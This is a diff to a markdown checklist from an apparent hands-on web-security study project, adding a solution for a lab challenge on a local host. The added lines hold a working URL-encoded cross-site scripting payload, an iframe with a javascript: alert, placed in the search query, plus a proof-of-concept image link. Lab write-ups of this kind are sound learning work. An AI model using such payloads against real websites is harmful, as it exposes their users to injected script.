@@ -60,4 +60,9 @@ As each challenge is completed:
 
 This checklist is part of an ongoing research and documentation project focused on mastering the exploitation of common web application vulnerabilities through practical, hands-on challenges.
 
+The challenge will be solved the moment you paste this in URL in the dearch bar - 
+
+"http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E"
+
+POC - ![image](https://github.com/user-attachments/assets/11546c62-9647-4c12-bca3-977f15f26cf0)
 
